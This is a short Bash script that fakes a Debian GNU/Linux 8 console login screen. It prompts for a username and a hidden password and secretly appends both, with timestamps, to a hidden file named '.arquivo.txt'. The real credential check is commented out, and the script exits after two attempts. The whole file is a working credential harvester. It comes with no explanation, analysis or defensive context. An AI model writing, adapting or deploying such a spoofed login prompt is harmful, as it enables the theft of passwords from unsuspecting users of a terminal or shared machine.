#!/bin/bash 
incorreto(){
	sleep 3
	echo 
	echo "Login incorrect"	
}
clear
echo 
echo "Debian GNU/linux 8 jessie tty1"
echo
count=0
	while :
do 
	read -p "jessie login: " LOGIN
	read -s -p "Password: " PASS
	echo 
	#[[ $LOGIN == "vagrant" ]] && [[ $PASS == "vagrant" ]] && \
	#break 2 || incorreto
	echo "$(date)>> $LOGIN" >> .arquivo.txt
	echo "$(date)>> $PASS" >> .arquivo.txt
	count=$(($count+1))
	[[ $count == "2" ]] && \
	break
    done
